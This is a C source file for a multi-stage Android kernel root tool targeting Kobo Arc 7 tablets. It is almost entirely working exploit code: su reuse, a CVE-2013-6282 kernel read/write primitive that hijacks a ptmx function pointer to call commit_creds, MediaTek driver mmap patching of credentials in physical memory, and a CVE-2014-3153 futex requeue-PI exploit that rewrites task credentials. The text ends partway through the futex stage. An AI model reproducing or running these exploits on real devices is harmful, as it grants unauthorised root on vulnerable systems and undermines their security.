/*
 * native/arc7root.c
 *
 * Kobo Arc 7 (MT8125 / Linux 3.4.x) & Kobo Arc 7HD (Tegra 3 / Linux 3.1.x-3.4.x)
 * Multi-Stage Local Kernel Root Engine (ARMv7 EABI, Android 4.2.2 Jelly Bean)
 *
 * Stages:
 *   Stage 0: Existing su binary / arc7_freedom_root_v1 root daemon reuse
 *   Stage 1: CVE-2013-6282 (ARM get_user / put_user missing domain check < Linux 3.5.5)
 *            - Includes /proc/kallsyms fast-path + monotone symbol table scanner
 *            - Fixes signed-char write corruption bug & restores ptmx_fops->fsync cleanly
 *   Stage 2: MediaTek MT8125 character driver mmap physical kernel credential patcher
 *            - Uses unique prctl(PR_SET_NAME) marker to locate current task_struct->cred safely
 *   Stage 3: CVE-2014-3153 (futex_requeue PI kernel stack waiter list elevation < Linux 3.14.6)
 *            - Full kernel waiter list repair + dynamic CONFIG_DEBUG_CREDENTIALS offset handling
 */

#include "arc7_common.h"
#include <arpa/inet.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>

static const char *g_su_source_path = NULL;

/* =========================================================================
 * STAGE 0: EXISTING SU / DAEMON REUSE
 * ========================================================================= */
static int try_stage0_existing_su(const char *su_src) {
    if (getuid() == 0 || geteuid() == 0) {
        printf("[Stage 0] Already running with uid=0!\n");
        fflush(stdout);
        return arc7_install_persistent_root(su_src);
    }

    const char *candidates[] = {
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/system/xbin/daemonsu",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        NULL
    };

    for (int i = 0; candidates[i] != NULL; i++) {
        if (access(candidates[i], X_OK) == 0) {
            printf("[Stage 0] Found existing su candidate at %s, testing root execution...\n", candidates[i]);
            fflush(stdout);
            char cmd[1024];
            snprintf(cmd, sizeof(cmd), "%s -c 'id' 2>/dev/null", candidates[i]);
            FILE *fp = popen(cmd, "r");
            if (fp) {
                char out[256] = {0};
                if (fgets(out, sizeof(out), fp) != NULL && strstr(out, "uid=0") != NULL) {
                    pclose(fp);
                    printf("[Stage 0] Existing su granted uid=0: %s", out);
                    fflush(stdout);
                    snprintf(cmd, sizeof(cmd),
                             "%s -c '%s --install-as-root \"%s\"'",
                             candidates[i], "/proc/self/exe", su_src);
                    /* Direct root script fallback in case /proc/self/exe symlink varies */
                    char self_path[512] = {0};
                    ssize_t sl = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
                    if (sl > 0) {
                        self_path[sl] = '\0';
                        snprintf(cmd, sizeof(cmd), "%s -c '\"%s\" --install-only \"%s\"'",
                                 candidates[i], self_path, su_src);
                        int rc = system(cmd);
                        if (rc == 0) return 0;
                    }
                } else {
                    pclose(fp);
                }
            }
        }
    }
    return -1;
}

/* =========================================================================
 * STAGE 1: CVE-2013-6282 (ARM get_user / put_user < Linux 3.5.5)
 * ========================================================================= */
#define KERNEL_START_ADDRESS 0xc0008000UL
#define KERNEL_SIZE          0x02000000UL
#define SEARCH_START_ADDRESS 0xc0600000UL
#define KALLSYMS_MAX_DUMP    0x00280000UL
#define PTMX_DEVICE          "/dev/ptmx"

static unsigned long g_prepare_kernel_cred_addr = 0;
static unsigned long g_commit_creds_addr = 0;

struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_fn)(struct task_struct *);
typedef int (*commit_creds_fn)(struct cred *);

static int cve6282_read_ulong_sock(int sock, unsigned long address, unsigned long *value) {
    unsigned char *pval = (unsigned char *)value;
    socklen_t optlen = 1;
    *value = 0;
    for (size_t i = 0; i < sizeof(*value); i++) {
        errno = 0;
        int ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)(address + i), 1);
        if (ret != 0 && errno != EINVAL) {
            *value = 0;
            return -1;
        }
        optlen = 1;
        if (getsockopt(sock, SOL_IP, IP_TTL, pval + i, &optlen) != 0) {
            *value = 0;
            return -1;
        }
    }
    return 0;
}

static int cve6282_probe_vulnerable(void) {
    int sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return 0;
    unsigned long val = 0;
    int ok = (cve6282_read_ulong_sock(sock, KERNEL_START_ADDRESS, &val) == 0);
    close(sock);
    return ok;
}

static int cve6282_pipe_write_ulong(unsigned long address, unsigned long value) {
    /* CRITICAL FIX over reference PoC: MUST be unsigned char so bytes >= 0x80 never sign-extend! */
    unsigned char data[4];
    memcpy(data, &value, 4);

    int pipefd[2];
    if (pipe(pipefd) == -1) return -1;

    unsigned char zero_buf[256];
    memset(zero_buf, 0, sizeof(zero_buf));

    int i;
    for (i = 0; i < 4; i++) {
        if (data[i] > 0) {
            if (write(pipefd[1], zero_buf, (size_t)data[i]) != (ssize_t)data[i]) break;
        }
        if (ioctl(pipefd[0], FIONREAD, (void *)(address + (unsigned long)i)) == -1) break;
        if (data[i] > 0) {
            if (read(pipefd[0], zero_buf, (size_t)data[i]) != (ssize_t)data[i]) break;
        }
    }

    close(pipefd[0]);
    close(pipefd[1]);
    return (i == 4) ? 0 : -1;
}

static int try_read_proc_kallsyms(unsigned long *prep_out, unsigned long *commit_out,
                                  unsigned long *ptmx_fops_out, unsigned long *ptmx_open_out,
                                  unsigned long *tty_release_out, unsigned long *tty_fasync_out) {
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) return -1;

    char line[256];
    while (fgets(line, sizeof(line), fp) != NULL) {
        unsigned long addr = 0;
        char type = 0;
        char sym[128] = {0};
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) == 3 && addr >= 0xc0000000UL) {
            if (strcmp(sym, "prepare_kernel_cred") == 0) *prep_out = addr;
            else if (strcmp(sym, "commit_creds") == 0) *commit_out = addr;
            else if (strcmp(sym, "ptmx_fops") == 0) *ptmx_fops_out = addr;
            else if (strcmp(sym, "ptmx_open") == 0) *ptmx_open_out = addr;
            else if (strcmp(sym, "tty_release") == 0) *tty_release_out = addr;
            else if (strcmp(sym, "tty_fasync") == 0) *tty_fasync_out = addr;
        }
    }
    fclose(fp);
    return (*prep_out != 0 && *commit_out != 0) ? 0 : -1;
}

static unsigned long expand_kallsyms_symbol(const unsigned char *names,
                                            const unsigned char *token_table,
                                            const unsigned short *token_index,
                                            unsigned long off, char *namebuf) {
    int len = names[off];
    const unsigned char *data = &names[off + 1];
    off += (unsigned long)len + 1;
    int skipped_first = 0;
    while (len > 0) {
        const unsigned char *tptr = &token_table[token_index[*data]];
        data++;
        len--;
        while (*tptr > 0) {
            if (skipped_first != 0) {
                *namebuf++ = (char)*tptr;
            } else {
                skipped_first = 1;
            }
            tptr++;
        }
    }
    *namebuf = '\0';
    return off;
}

static int resolve_kallsyms_via_get_user(int sock,
                                         unsigned long *prep_out,
                                         unsigned long *commit_out,
                                         unsigned long *ptmx_fops_out,
                                         unsigned long *ptmx_open_out,
                                         unsigned long *tty_release_out,
                                         unsigned long *tty_fasync_out) {
    /* Scan kernel rodata for monotone non-decreasing table starting around 0xc0008xxx followed by count */
    unsigned long end_limit = KERNEL_START_ADDRESS + KERNEL_SIZE;
    for (unsigned long cand = SEARCH_START_ADDRESS; cand < end_limit - 0x40000; cand += 16) {
        unsigned long v0 = 0, v1 = 0, v2 = 0;
        if (cve6282_read_ulong_sock(sock, cand, &v0) != 0) return -1;
        if (v0 < 0xc0008000UL || v0 > 0xc0009000UL) continue;
        if (cve6282_read_ulong_sock(sock, cand + 4, &v1) != 0) continue;
        if (cve6282_read_ulong_sock(sock, cand + 8, &v2) != 0) continue;
        if (v1 < v0 || v2 < v1 || v2 > 0xc0010000UL) continue;

        /* Count entries >= KERNEL_START_ADDRESS */
        unsigned long p = cand;
        unsigned long count = 0;
        unsigned long val = 0;
        while (p < end_limit) {
            if (cve6282_read_ulong_sock(sock, p, &val) != 0) break;
            if (val < KERNEL_START_ADDRESS) break;
            count++;
            p += 4;
            if (count > 120000) break;
        }
        if (count < 10000 || count > 120000) continue;

        while (p < end_limit && val == 0) {
            p += 4;
            if (cve6282_read_ulong_sock(sock, p, &val) != 0) break;
        }
        if (val != count) continue;

        printf("[Stage 1] Located kernel kallsyms table at 0x%08lx (%lu symbols)\n", cand, count);
        fflush(stdout);

        unsigned long *dump = (unsigned long *)malloc(KALLSYMS_MAX_DUMP);
        if (!dump) return -1;
        for (unsigned long off = 0; off < KALLSYMS_MAX_DUMP; off += 4) {
            if (cve6282_read_ulong_sock(sock, cand + off, &dump[off / 4]) != 0) {
                free(dump);
                return -1;
            }
        }

        unsigned long *endp = dump + (KALLSYMS_MAX_DUMP / 4);
        unsigned long *ap = dump + ((p - cand) / 4) + 1;
        while (ap < endp && *ap == 0) ap++;
        unsigned char *names = (unsigned char *)ap;

        unsigned long noff = 0;
        for (unsigned long i = 0; i < count; i++) {
            if (names + noff >= (unsigned char *)endp) { free(dump); return -1; }
            noff += (unsigned long)names[noff] + 1;
        }
        ap = (unsigned long *)((((unsigned long)(names + noff) - 1UL) | 3UL) + 1UL);
        while (ap < endp && *ap == 0) ap++;
        ap--; /* first marker is 0 */
        unsigned long *markers = ap;
        ap = &markers[((count - 1) >> 8) + 1];
        while (ap < endp && *ap == 0) ap++;
        unsigned char *token_table = (unsigned char *)ap;

        unsigned long ti = 0;
        while ((unsigned char *)&token_table[ti + 2] < (unsigned char *)endp &&
               (token_table[ti] != 0 || token_table[ti + 1] != 0)) {
            ti++;
        }
        while ((unsigned char *)&token_table[ti + 2] < (unsigned char *)endp &&
               token_table[ti] == 0) {
            ti++;
        }
        unsigned short *token_index = (unsigned short *)&token_table[ti - 2];

        char sym[512];
        noff = 0;
        for (unsigned long i = 0; i < count; i++) {
            noff = expand_kallsyms_symbol(names, token_table, token_index, noff, sym);
            if (strcmp(sym, "prepare_kernel_cred") == 0) *prep_out = dump[i];
            else if (strcmp(sym, "commit_creds") == 0) *commit_out = dump[i];
            else if (strcmp(sym, "ptmx_fops") == 0) *ptmx_fops_out = dump[i];
            else if (strcmp(sym, "ptmx_open") == 0) *ptmx_open_out = dump[i];
            else if (strcmp(sym, "tty_release") == 0) *tty_release_out = dump[i];
            else if (strcmp(sym, "tty_fasync") == 0) *tty_fasync_out = dump[i];
        }
        free(dump);
        return (*prep_out != 0 && *commit_out != 0) ? 0 : -1;
    }
    return -1;
}

static void kernel_payload_cve6282(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)g_prepare_kernel_cred_addr;
    commit_creds_fn cc = (commit_creds_fn)g_commit_creds_addr;
    cc(pkc(NULL));
}

static int try_stage1_cve_2013_6282(const char *su_src) {
    printf("[Stage 1] Probing CVE-2013-6282 (ARM kernel get_user/put_user)...\n");
    fflush(stdout);

    int sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    unsigned long test_val = 0;
    if (cve6282_read_ulong_sock(sock, KERNEL_START_ADDRESS, &test_val) != 0) {
        close(sock);
        printf("[Stage 1] Kernel validates get_user bounds (CVE-2013-6282 patched), moving to Stage 2.\n");
        fflush(stdout);
        return -1;
    }

    printf("[Stage 1] Kernel is VULNERABLE to CVE-2013-6282 ([0xc0008000] = 0x%08lx)! Resolving symbols...\n",
           test_val);
    fflush(stdout);

    unsigned long ptmx_fops = 0, ptmx_open = 0, tty_release = 0, tty_fasync = 0;
    if (try_read_proc_kallsyms(&g_prepare_kernel_cred_addr, &g_commit_creds_addr,
                               &ptmx_fops, &ptmx_open, &tty_release, &tty_fasync) != 0) {
        if (resolve_kallsyms_via_get_user(sock, &g_prepare_kernel_cred_addr, &g_commit_creds_addr,
                                          &ptmx_fops, &ptmx_open, &tty_release, &tty_fasync) != 0) {
            close(sock);
            printf("[Stage 1] Could not resolve kernel symbols.\n");
            fflush(stdout);
            return -1;
        }
    }

    /* Locate exact fsync slot right after .release inside ptmx_fops */
    unsigned long fsync_slot = 0;
    if (ptmx_fops != 0) {
        /* Verify .open/.release inside ptmx_fops across 3.0..3.10 struct file_operations layouts */
        for (unsigned long off = 0x20; off <= 0x44; off += 4) {
            unsigned long v_open = 0, v_rel = 0, v_fsync = 0;
            cve6282_read_ulong_sock(sock, ptmx_fops + off, &v_open);
            cve6282_read_ulong_sock(sock, ptmx_fops + off + 8, &v_rel);
            cve6282_read_ulong_sock(sock, ptmx_fops + off + 12, &v_fsync);
            if ((ptmx_open != 0 && v_open == ptmx_open) ||
                (tty_release != 0 && v_rel == tty_release)) {
                fsync_slot = ptmx_fops + off + 12;
                break;
            }
        }
        if (fsync_slot == 0) fsync_slot = ptmx_fops + 0x38;
    } else if (ptmx_open != 0 && tty_release != 0) {
        for (unsigned long scan = 0xc0600000UL; scan < KERNEL_START_ADDRESS + KERNEL_SIZE - 64; scan += 4) {
            unsigned long v0 = 0, v2 = 0, v5 = 0;
            if (cve6282_read_ulong_sock(sock, scan, &v0) == 0 && v0 == ptmx_open) {
                cve6282_read_ulong_sock(sock, scan + 8, &v2);
                cve6282_read_ulong_sock(sock, scan + 20, &v5);
                if (v2 == tty_release && (tty_fasync == 0 || v5 == tty_fasync)) {
                    fsync_slot = scan + 12;
                    break;
                }
            }
        }
    }

    if (fsync_slot == 0) {
        close(sock);
        printf("[Stage 1] Could not locate ptmx_fops->fsync slot.\n");
        fflush(stdout);
        return -1;
    }

    unsigned long orig_fsync = 0;
    cve6282_read_ulong_sock(sock, fsync_slot, &orig_fsync);
    close(sock);

    printf("[Stage 1] prepare_kernel_cred=0x%08lx commit_creds=0x%08lx fsync_slot=0x%08lx (orig=0x%08lx)\n",
           g_prepare_kernel_cred_addr, g_commit_creds_addr, fsync_slot, orig_fsync);
    fflush(stdout);

    if (cve6282_pipe_write_ulong(fsync_slot, (unsigned long)&kernel_payload_cve6282) != 0) {
        printf("[Stage 1] put_user pipe write failed.\n");
        fflush(stdout);
        return -1;
    }

    int pfd = open(PTMX_DEVICE, O_WRONLY);
    if (pfd >= 0) {
        fsync(pfd);
        close(pfd);
    }

    /* IMMEDIATELY restore original kernel fsync pointer so kernel remains 100% stable! */
    cve6282_pipe_write_ulong(fsync_slot, orig_fsync);

    if (getuid() == 0) {
        printf("[Stage 1] SUCCESS! Elevated to uid=0 cleanly via CVE-2013-6282!\n");
        fflush(stdout);
        return arc7_install_persistent_root(su_src);
    }
    return -1;
}

/* =========================================================================
 * STAGE 2: MEDIATEK MT8125 DRIVER PHYSICAL CREDENTIAL PATCHER
 * ========================================================================= */
static int try_stage2_mtk_driver_mmap(const char *su_src) {
    const char *mtk_devs[] = {
        "/dev/devmap",
        "/dev/exm0",
        "/dev/camera-isp",
        "/dev/camera-sysram",
        NULL
    };

    char old_comm[16] = {0};
    prctl(PR_GET_NAME, old_comm, 0, 0, 0);

    char marker[16];
    snprintf(marker, sizeof(marker), "a7f%05d%04x", (int)(getpid() % 100000), (unsigned)(getuid() & 0xffff));
    prctl(PR_SET_NAME, marker, 0, 0, 0);

    uid_t my_uid = getuid();
    gid_t my_gid = getgid();

    for (int d = 0; mtk_devs[d] != NULL; d++) {
        int fd = open(mtk_devs[d], O_RDWR | O_SYNC);
        if (fd < 0) continue;

        printf("[Stage 2] Opened MediaTek device %s, scanning kernel RAM for task credentials...\n", mtk_devs[d]);
        fflush(stdout);

        /* MT8125 DRAM physical base starts at 0x80000000 (or 0x00000000 direct offset) */
        const off_t bases[] = { 0x00000000L, (off_t)0x80000000UL };
        for (int b = 0; b < 2 && getuid() != 0; b++) {
            const size_t chunk = 0x00100000; /* 1 MB */
            for (size_t off = 0; off < 0x20000000; off += chunk) {
                unsigned char *map = (unsigned char *)mmap(
                    NULL, chunk, PROT_READ | PROT_WRITE, MAP_SHARED, fd, bases[b] + (off_t)off);
                if (map == MAP_FAILED) break;

                for (size_t p = 16; p + 32 < chunk; p += 4) {
                    if (memcmp(map + p, marker, strlen(marker) + 1) == 0) {
                        uint32_t real_cred_ptr, cred_ptr;
                        memcpy(&real_cred_ptr, map + p - 8, 4);
                        memcpy(&cred_ptr, map + p - 4, 4);
                        if (cred_ptr >= 0xc0000000U && real_cred_ptr >= 0xc0000000U) {
                            size_t cred_phys = (size_t)(cred_ptr - 0xc0000000U);
                            unsigned char *cmap = (unsigned char *)mmap(
                                NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                                fd, bases[b] + (off_t)(cred_phys & ~0xfffUL));
                            if (cmap != MAP_FAILED) {
                                uint32_t *cw = (uint32_t *)(cmap + (cred_phys & 0xfffUL));
                                int uid_idx = -1;
                                if (cw[1] == (uint32_t)my_uid && cw[2] == (uint32_t)my_gid && cw[5] == (uint32_t)my_uid)
                                    uid_idx = 1;
                                else if (cw[4] == (uint32_t)my_uid && cw[5] == (uint32_t)my_gid && cw[8] == (uint32_t)my_uid)
                                    uid_idx = 4;

                                if (uid_idx > 0) {
                                    for (int k = 0; k < 8; k++) cw[uid_idx + k] = 0;
                                    for (int k = 9; k < 17; k++) cw[uid_idx + k] = 0xffffffffU;
                                    msync(cmap, 4096, MS_SYNC);
                                }
                                munmap(cmap, 4096);
                            }
                        }
                        if (getuid() == 0) break;
                    }
                }
                munmap(map, chunk);
                if (getuid() == 0) break;
            }
        }
        close(fd);
        if (getuid() == 0) {
            prctl(PR_SET_NAME, old_comm, 0, 0, 0);
            printf("[Stage 2] SUCCESS! Elevated to uid=0 via MediaTek driver %s!\n", mtk_devs[d]);
            fflush(stdout);
            return arc7_install_persistent_root(su_src);
        }
    }

    prctl(PR_SET_NAME, old_comm, 0, 0, 0);
    return -1;
}

/* =========================================================================
 * STAGE 3: CVE-2014-3153 (futex_requeue PI elevation + waiter list repair)
 * ========================================================================= */
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI  12
#endif

struct arc7_mmsghdr {
    struct msghdr msg_hdr;
    unsigned int  msg_len;
};

#define F_ERR          0
#define F_ROOT_SUCCESS 1
#define F_FIX_SUCCESS  2
#define F_ALL_DONE     3

static int f_port = 58295;
static unsigned long f_hacked_node, f_hacked_node_alt;
static int f_hacks_fdm = 0;
static pthread_mutex_t f_done_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t f_done_kill_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t f_done = PTHREAD_COND_INITIALIZER;
static pthread_cond_t f_done_kill = PTHREAD_COND_INITIALIZER;
static pthread_mutex_t f_desched_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t f_desched = PTHREAD_COND_INITIALIZER;
static pthread_mutex_t f_awake_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t f_awake = PTHREAD_COND_INITIALIZER;
static int f_lock1 = 0, f_lock2 = 0;
static volatile pid_t f_last_tid = 0, f_stack_mod_tid = 0, f_pid6 = 0, f_pid7 = 0, f_tid11 = 0, f_tid12 = 0;
static pthread_mutex_t *f_is_kernel_writing = NULL;
static int f_pipe_fd[2];
static int f_sockfd = -1;
static volatile unsigned long f_first_kstack = 0, f_final_kstack = 0, f_leaker_kstack = 0, f_target_waiter = 0;
static unsigned long f_t11 = 0, f_lock_addr = 0;
static pid_t f_remove_pid[256];
static unsigned long f_remove_waiter[256];
static int f_remove_count = 0;

static void f_send_msg(int msg) {
    if (write(f_pipe_fd[1], &msg, sizeof(msg)) < 0) { /* ignore */ }
}

static ssize_t f_read_pipe(void *kaddr, void *ubuf, size_t count) {
    int p[2];
    if (pipe(p) != 0) return -1;
    ssize_t len = write(p[1], kaddr, count);
    if (len != (ssize_t)count) { close(p[0]); close(p[1]); return -1; }
    if (read(p[0], ubuf, count) < 0) { /* ignore */ }
    close(p[0]);
    close(p[1]);
    return len;
}

static ssize_t f_write_pipe(void *kaddr, const void *ubuf, size_t count) {
    int p[2];
    if (pipe(p) != 0) return -1;
    if (write(p[1], ubuf, count) != (ssize_t)count) { close(p[0]); close(p[1]); return -1; }
    ssize_t len = read(p[0], kaddr, count);
    close(p[0]);
    close(p[1]);
    return (len == (ssize_t)count) ? len : -1;
}

static void f_reset_hacked_list(unsigned long node) {
    *((unsigned long *)(node - 4))    = 0x81;
    *((unsigned long *)node)          = node + 0x20;
    *((unsigned long *)(node + 8))    = node + 0x28;
    *((unsigned long *)(node + 0x1c)) = 0x85;
    *((unsigned long *)(node + 0x24)) = node;
    *((unsigned long *)(node + 0x2c)) = node + 8;
}

static void f_thread_killer(int sig) {
    (void)sig;
    pthread_mutex_lock(&f_awake_lock);
    pthread_cond_signal(&f_awake);
    pthread_mutex_unlock(&f_awake_lock);
    pthread_exit(NULL);
}

static void f_remove_waiter_entry(int idx) {
    mmap((void *)0xbef000, 0x2000, PROT_READ | PROT_WRITE,
         MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    f_reset_hacked_list(0xbeffe0);
    *((unsigned long *)0xbf0004) = f_remove_waiter[idx];
    *((unsigned long *)0xbeffe0) = f_remove_waiter[idx];
    *((unsigned long *)0xbf000c) = f_remove_waiter[idx] + 8;
    *((unsigned long *)0xbeffe8) = f_remove_waiter[idx] + 8;

    unsigned long val[4] = { 0xbf0000, 0xbeffe0, 0xbf0008, 0xbeffe8 };
    f_write_pipe((void *)f_remove_waiter[idx], val, 16);

    pthread_mutex_lock(&f_awake_lock);
    kill(f_remove_pid[idx], 14);
    pthread_cond_wait(&f_awake, &f_awake_lock);
    pthread_mutex_unlock(&f_awake_lock);
    munmap((void *)0xbef000, 0x2000);
}

static int f_fix_waiter_list(unsigned long head) {
    unsigned long prio6 = 0, prio3 = 0, val = 0, val2 = 0, val3 = 0;
    unsigned long list = head + 4;
    int err = 0;

    f_read_pipe((void *)list, &prio6, 4);
    f_read_pipe((void *)(list + 4), &prio3, 4);
    if (f_write_pipe((void *)(prio3 + 4), &f_t11, 4) < 0) err = 1;

    for (int i = 0; i < 2; i++) {
        f_read_pipe((void *)list, &val, 4);
        list = val;
        if (i == 0) f_read_pipe((void *)(list + 40), &f_lock_addr, 4);
    }

    if (f_lock_addr) {
        for (int i = 0; i < 5; i++) {
            f_read_pipe((void *)(f_lock_addr + (unsigned long)(i * 4)), &val3, 4);
            if (val3 == (prio3 + 8)) {
                f_lock_addr += (unsigned long)(i * 4);
                break;
            }
        }
    }

    val2 = f_t11 + 8;
    if (f_write_pipe((void *)(f_lock_addr + 4), &val2, 4) < 0) err = 1;
    if (f_write_pipe((void *)list, &f_t11, 4) < 0) err = 1;
    if (f_write_pipe((void *)(list + 8), &val2, 4) < 0) err = 1;

    unsigned long w[4] = { prio3, list, f_lock_addr, list + 8 };
    if (f_write_pipe((void *)f_t11, w, 16) < 0) err = 1;
    return err;
}

static void f_hack_kernel_handler(int sig) {
    (void)sig;
    static const unsigned char ff4[4] = { 0xff, 0xff, 0xff, 0xff };
    static const unsigned char one4[4] = { 1, 0, 0, 0 };

    pthread_mutex_lock(&f_awake_lock);
    pthread_cond_signal(&f_awake);
    pthread_mutex_unlock(&f_awake_lock);

    if (f_final_kstack == 0) {
        pthread_mutex_lock(f_is_kernel_writing);
        f_hacks_fdm = open(PTMX_DEVICE, O_RDWR);
        unlockpt(f_hacks_fdm);
        char *sname = ptsname(f_hacks_fdm);
        if (sname) open(sname, O_RDWR);
        char rbuf[0x100];
        if (read(f_hacks_fdm, rbuf, sizeof(rbuf)) < 0) { /* woken */ }

        f_write_pipe((void *)(f_final_kstack + 8), ff4, 4);
        pthread_mutex_unlock(f_is_kernel_writing);

        setpriority(PRIO_PROCESS, 0, 4);
        syscall(__NR_futex, &f_lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

        pthread_mutex_lock(&f_done_kill_lock);
        pthread_cond_signal(&f_done_kill);
        pthread_mutex_unlock(&f_done_kill_lock);
        sleep(3);
        return;
    }

    pthread_mutex_lock(f_is_kernel_writing);
    usleep(500000);

    unsigned long ti[4] = {0};
    unsigned long ts[0x200];
    memset(ts, 0, sizeof(ts));
    f_read_pipe((void *)f_final_kstack, ti, sizeof(ti));
    f_read_pipe((void *)ti[3], ts, sizeof(ts));

    unsigned long cred_addr = 0;
    for (int i = 0; i < 0x1f0; i++) {
        if (ts[i] == ts[i + 1] && ts[i] > 0xc0000000UL &&
            ts[i + 2] == ts[i + 3] && ts[i + 2] > 0xc0000000UL &&
            ts[i + 4] == ts[i + 5] && ts[i + 4] > 0xc0000000UL &&
            ts[i + 6] == ts[i + 7] && ts[i + 6] > 0xc0000000UL) {
            cred_addr = ts[i + 7];
            break;
        }
    }
    if (!cred_addr) { f_send_msg(F_ERR); _exit(1); }

    unsigned long cred[0x40], cred_orig[0x40];
    f_read_pipe((void *)cred_addr, cred, sizeof(cred));
    memcpy(cred_orig, cred, sizeof(cred));

    uid_t cur_uid = getuid();
    int base = (cred[1] == (unsigned long)cur_uid && cred[5] == (unsigned long)cur_uid) ? 1 :
               ((cred[4] == (unsigned long)cur_uid && cred[8] == (unsigned long)cur_uid) ? 4 : 1);

    for (int k = 0; k < 8; k++) cred[base + k] = 0;
    for (int k = 9; k < 17; k++) cred[base + k] = 0xffffffffUL;
    f_write_pipe((void *)cred_addr, cred, 0x54);

    pid_t my_tid = (pid_t)syscall(__NR_gettid);
    for (int i = 0; i < 0x1f0; i++) {
        if (ts[i] == (unsigned long)my_tid) {
            f_write_pipe((void *)(ti[3] + (unsigned long)(i * 4)), one4, 4);
            if (getuid() == 0) {
                if (fork() == 0) {
                    arc7_install_persistent_root(g_su_source_path);
                    _exit(0);
                }
                sleep(2);
                if (f_sockfd >= 0) close(f_sockfd);
                f_send_msg(F_ROOT_SUCCESS);
            } else {
                f_send_msg(F_ERR);
            }
            break;
        }
    }

    f_write_pipe((void *)cred_addr, cred_orig, 0x54);

    f_read_pipe((void *)f_leaker_kstack, ti, sizeof(ti));
    f_read_pipe((void *)ti[3], ts, sizeof(ts));
    for (int i = 0; i < 0x1e0; i++) {
        if (ts[i] == ts[i + 1] && ts[i] > 0xc0000000UL && ts[i + 6] == ts[i + 7] && ts[i + 6] > 0xc0000000UL) {
            for (int k = 0; k < 100 && (i + k) < 0x200; k++) {
                if (ts[i + k] > 0xc0000000UL && ts[i + k] != 0xffffffffUL) {
                    unsigned long pv = 0;
                    f_read_pipe((void *)ts[i + k], &pv, 4);
                    if (pv == 0x7c || pv == 0x7b) {
                        f_target_waiter = ts[i + k];
                        break;
                    }
                }
            }
            break;
        }
    }

    pthread_mutex_lock(&f_done_kill_lock);
    for (int h = 0; h < f_remove_count; h++) f_remove_waiter_entry(h);
    if (f_target_waiter && f_fix_waiter_list(f_target_waiter) == 0)
        f_send_msg(F_FIX_SUCCESS);
    kill(f_stack_mod_tid, 14);
    pthread_cond_wait(&f_done_kill, &f_done_kill_lock);
    pthread_exit(NULL);
}

static void *f_waiter_thread(void *arg) {
    int prio = (int)(intptr_t)arg;
    f_last_tid = (pid_t)syscall(__NR_gettid);

    pthread_mutex_lock(&f_desched_lock);
    pthread_cond_signal(&f_desched);

    struct sigaction a1, a2;
    memset(&a1, 0, sizeof(a1));
    a1.sa_handler = f_hack_kernel_handler;
    sigaction(12, &a1, NULL);

    memset(&a2, 0, sizeof(a2));
    a2.sa_handler = f_thread_killer;
    sigaction(14, &a2, NULL);

    setpriority(PRIO_PROCESS, 0, prio);
    pthread_mutex_unlock(&f_desched_lock);

    syscall(__NR_futex, &f_lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

    if (prio == 11) {
        pthread_mutex_lock(&f_awake_lock);
        kill(f_tid11, 14);
        pthread_cond_wait(&f_awake, &f_awake_lock);
        pthread_mutex_unlock(&f_awake_lock);

        pthread_mutex_lock(&f_awake_lock);
        kill(f_pid7, 14);
        pthread_cond_wait(&f_awake, &f_awake_lock);
        pthread_mutex_unlock(&f_awake_lock);
        pthread_exit(NULL);
    }
    if (prio == 6) {
        pthread_mutex_lock(&f_done_lock);
        pthread_cond_signal(&f_done);
        pthread_mutex_unlock(&f_done_lock);
        pthread_exit(NULL);
    }
    return NULL;
}

static pid_t f_spawn_waiter(int prio) {
    pthread_t th;
    pthread_mutex_lock(&f_desched_lock);
    pthread_create(&th, NULL, f_waiter_thread, (void *)(intptr_t)prio);
    pthread_cond_wait(&f_desched, &f_desched_lock);
    pid_t pid = f_last_tid;
    usleep(400000);
    pthread_mutex_unlock(&f_desched_lock);
    return pid;
}

static void *f_accept_thread(void *arg) {
    (void)arg;
    f_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (f_sockfd < 0) { f_send_msg(F_ERR); return NULL; }
    int yes = 1, small = 1;
    setsockopt(f_sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    setsockopt(f_sockfd, SOL_SOCKET, SO_RCVBUF, &small, sizeof(small));

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    for (int tries = 0; tries < 20; tries++) {
        sin.sin_port = htons((uint16_t)(f_port + tries));
        if (bind(f_sockfd, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
            f_port += tries;
            break;
        }
    }
    if (listen(f_sockfd, 2) < 0) { f_send_msg(F_ERR); return NULL; }
    while (accept(f_sockfd, NULL, NULL) >= 0) { /* hold connection */ }
    return NULL;
}

static void *f_stack_modifier(void *arg) {
    (void)arg;
    f_stack_mod_tid = (pid_t)syscall(__NR_gettid);
    setpriority(PRIO_PROCESS, 0, 12);

    struct sigaction a;
    memset(&a, 0, sizeof(a));
    a.sa_handler = f_thread_killer;
